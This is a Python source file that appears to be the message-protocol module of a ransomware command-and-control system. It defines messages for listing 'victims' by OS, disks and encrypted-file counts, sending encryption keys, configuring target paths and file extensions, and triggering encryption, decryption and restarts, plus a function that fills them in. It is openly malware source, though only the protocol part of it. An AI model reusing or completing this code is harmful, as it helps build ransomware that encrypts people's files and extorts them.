#Victim
list_victim_req = {'LIST_REQ': None}
list_victim_resp = {'VICTIM': 0, 'HASH': "", 'OS': "", 'DISKS': "", 'STATE': 0, 'NB_FILES' : 0}
list_victim_end = {'LIST_END': None}

#History
history_req = {'HIST_REQ': 0}
history_resp = {'HIST_RESP': 0, 'TIMESTAMP': 0, 'STATE': "", 'NB_FILES': 0}
history_end = {'HIST_END': 0}

change_state = {"CHGSTATE": 0, "STATE": ""}

initialize_req={"INITIALIZE": "", "OS": "", "DISKS": ""}
initialize_key={"KEY_RESP": 0, "KEY": "", "STATE": ""}
initialize_resp={"CONFIGURE": 0, "SETTING": {"DISKS": "", "PATHS": [], "FILE_EXT": [], "FREQ": 0, "KEY": "", "STATE": ""}}

crypt_start = {'CRYPT': 0}

pending_msg= {'PENDING': 0, 'NB_FILE': 0}

decrypt_req= {'DECRYPT': 0, 'NB_FILE': 0}

protected_req = {'PROTECTREQ': 0,'NB_FILE': 0}
count_crypted= {'COUNT': 0, 'NB_FILE': 0}
protected_resp = {'PROTECTRESP': 0, 'MESSAGE': ""}

restart_req = {'RESTART': 0}
restart_resp = {'RESTART_RESP': 0, 'KEY': ""}



def set_msg(message_type, donnees=None):
    if message_type.upper() == "LIST_REQ":
        return list_victim_req
    elif message_type.upper() == "VICTIM":
        if donnees is not None and len(donnees)==6:
            list_victim_resp['VICTIM'] = donnees[0]
            list_victim_resp['HASH'] = donnees[1]
            list_victim_resp['OS'] = donnees[2]
            list_victim_resp['DISKS'] = donnees[3]
            list_victim_resp['STATE'] = donnees[4]
            list_victim_resp['NB_FILES'] = donnees[5]
            return list_victim_resp
        else:
            return None
    elif message_type.upper() == "LIST_END":
        return list_victim_end
    elif message_type.upper() == "HIST_REQ":
        if donnees is not None and len(donnees)==1:
            history_req['HIST_REQ'] = donnees[0]
            return history_req
        else:
            return None
    elif message_type.upper() == "HIST_RESP":
        if donnees is not None and len(donnees)==4:
            history_resp['HIST_RESP'] = donnees[0]
            history_resp['TIMESTAMP'] = donnees[1]
            history_resp['STATE'] = donnees[2]
            history_resp['NB_FILES'] = donnees[3]
            return history_resp
        else:
            return None
    elif message_type.upper() == "HIST_END":
        if donnees is not None and len(donnees) == 1:
            history_end['HIST_END'] = donnees[0]
            return history_end
        else:
            return None
    elif message_type.upper() == "CHGSTATE":
        if donnees is not None and len(donnees)==2:
            change_state['CHGSTATE'] = donnees[0]
            change_state['STATE'] = donnees[1]
            return change_state
        else:
            return None
    elif message_type.upper() == "INITIALIZE":
        if donnees is not None and len(donnees)==3:
            initialize_req['INITIALIZE'] = donnees[0]
            initialize_req['OS'] = donnees[1]
            initialize_req['DISKS'] = donnees[2]
            return initialize_req
        else:
            return None
    elif message_type.upper() == "KEY_RESP":
        if donnees is not None and len(donnees)==3:
            initialize_key['KEY_RESP'] = donnees[0]
            initialize_key['KEY'] = donnees[1]
            initialize_key["STATE"] = donnees[2]
            return initialize_key
        else:
            return None
    elif message_type.upper() == "CONFIGURE":
        if donnees is not None and len(donnees)==2 and len(donnees[1])==6:
            initialize_resp['CONFIGURE'] = donnees[0]
            initialize_resp['SETTING']['DISKS'] = donnees[1][0]
            initialize_resp['SETTING']['PATHS'] = donnees[1][1]
            initialize_resp['SETTING']['FILE_EXT'] = donnees[1][2]
            initialize_resp['SETTING']['FREQ'] = donnees[1][3]
            initialize_resp['SETTING']['KEY'] = donnees[1][4]
            initialize_resp['SETTING']['STATE'] = donnees[1][5]
            return initialize_resp
        else:
            return None
    elif message_type.upper() == "CRYPT":
        if donnees is not None and len(donnees)==1:
            crypt_start['CRYPT'] = donnees[0]
            return crypt_start
        else:
            return None
    elif message_type.upper() == "PENDING":
        if donnees is not None and len(donnees)==2:
            pending_msg['PENDING'] = donnees[0]
            pending_msg['NB_FILE'] = donnees[1]
            return pending_msg
        else:
            return None
    elif message_type.upper() == "DECRYPT":
        if donnees is not None and len(donnees)==2:
            decrypt_req['DECRYPT'] = donnees[0]
            decrypt_req['NB_FILE'] = donnees[1]
            return decrypt_req
        else:
            return None
    elif message_type.upper() == "PROTECTREQ":
        if donnees is not None and len(donnees)==2:
            protected_req['PROTECTREQ'] = donnees[0]
            protected_req['NB_FILE'] = donnees[1]
            return protected_req
        else:
            return None
    elif message_type.upper() == "COUNT":
        if donnees is not None and len(donnees)==2:
            count_crypted['COUNT'] = donnees[0]
            count_crypted['NB_FILE'] = donnees[1]
            return count_crypted
        else:
            return None
    elif message_type.upper() == "PROTECTRESP":
        if donnees is not None and len(donnees)==2:
            protected_resp['PROTECTRESP'] = donnees[0]
            protected_resp['MESSAGE'] = donnees[1]
            return protected_resp
        else:
            return None
    elif message_type.upper() == "RESTART":
        if donnees is not None and len(donnees)==1:
            restart_req['RESTART'] = donnees[0]
            return restart_req
        else:
            return None
    elif message_type.upper() == "RESTART_RESP":
        if donnees is not None and len(donnees)==2:
            restart_resp['RESTART_RESP'] = donnees[0]
            restart_resp['KEY'] = donnees[1]
            return restart_resp
        else:
            return None


def get_message_type(message):
    return list(message.keys())[0]
